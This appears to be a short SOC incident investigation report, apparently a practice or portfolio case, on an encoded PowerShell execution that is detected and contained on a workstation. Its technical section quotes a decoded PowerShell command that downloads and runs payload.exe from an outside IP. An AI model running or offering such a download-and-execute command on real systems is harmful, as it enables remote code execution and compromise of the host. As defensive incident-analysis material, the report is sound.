
---

# 🔵 4️⃣ ENTERPRISE INVESTIGATION #2

📁 investigations/SOC-2026-002-Suspicious-PowerShell.md

```md
# CASE ID: SOC-2026-002
# Incident Type: Execution + C2
# Severity: High
# Status: Contained

---

# 1. Executive Summary

On 03 Feb 2026, encoded PowerShell execution was detected on workstation WIN-CLIENT-03 under account admin.local.

Decoded command confirmed download and execution of remote payload from known malicious IP 45.88.10.200.

Endpoint isolation was initiated immediately.

---

# 2. Alert Metadata

| Field | Value |
|-------|--------|
| Detection Source | SIEM + EDR |
| Rule | Encoded PowerShell Execution |
| Host | WIN-CLIENT-03 |
| User | admin.local |
| Time | 2026-02-03 09:14 UTC |

---

# 3. Technical Investigation

## Decoded Command

```powershell
Invoke-WebRequest http://45.88.10.200/payload.exe -OutFile payload.exe
Start-Process payload.exe

# 4. Network Activity

Destination IP: 45.88.10.200
Protocol: HTTP
Geo: Eastern Europe
